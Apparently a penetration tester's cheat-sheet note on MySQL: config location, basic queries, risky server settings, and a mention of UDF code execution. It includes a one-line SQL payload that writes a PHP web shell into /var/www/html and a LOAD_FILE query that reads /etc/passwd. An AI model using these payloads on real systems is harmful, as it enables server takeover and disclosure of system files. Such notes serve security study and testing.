Config file: `/etc/mysql/mysql.conf.d/mysqld.cnf` 
Nmap script: _mysql*_

```bash
cat /etc/mysql/mysql.conf.d/mysqld.cnf | grep -v "#" | sed -r '/^\s*$/d'
```
## Cheatsheet

```mysql
SHOW databases / tables;
USE <database>;
DESCRIBE <table>;
SELECT * FROM <table> WHERE <column> = "<string>";
$ mysqldump --host=10.0.0.27 [tablename]
select version();
```
### Dangerous Settings

| **Settings**       | **Description**                                                                                                                                                                                                                                                           |
| ------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `user`             | Sets which user the MySQL service will run as.                                                                                                                                                                                                                            |
| `password`         | Sets the password for the MySQL user.                                                                                                                                                                                                                                     |
| `admin_address`    | The IP address on which to listen for TCP/IP connections on the administrative network interface.                                                                                                                                                                         |
| `debug`            | This variable indicates the current debugging settings                                                                                                                                                                                                                    |
| `sql_warnings`     | This variable controls whether single-row INSERT statements produce an information string if warnings occur.                                                                                                                                                              |
| `secure_file_priv` | This variable is used to limit the effect of data import and export operations. (for example by the `LOAD DATA` and `SELECT … INTO OUTFILE` statements and the [LOAD_FILE()](https://dev.mysql.com/doc/refman/5.7/en/string-functions.html#function_load-file) function). |
> `system schema` (`sys`) and `information schema` (`information_schema`) are most important databases.

If [User Defined Functions](https://dotnettutorials.net/lesson/user-defined-functions-in-mysql/) are allowed, we can execute C/C++ code as a function within SQL ([GitHub repository](https://github.com/mysqludf/lib_mysqludf_sys))

# Write Local Files
`MySQL` does not have a stored procedure like `xp_cmdshell`, but we can write to a location in the file system that executes our commands for us.
```mysql
> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
```
>**NOTE:** a global system variable [secure_file_priv](https://dev.mysql.com/doc/refman/5.7/en/server-system-variables.html#sysvar_secure_file_priv) limits the effect of data import and export operations as mentioned. These operations are permitted only to users who have the [FILE](https://dev.mysql.com/doc/refman/5.7/en/privileges-provided.html#priv_file) privilege.
# Read File
```mysql
> select LOAD_FILE("/etc/passwd");
```
# Tools
- [[MySQL - tool]]
- [[dbeaver]]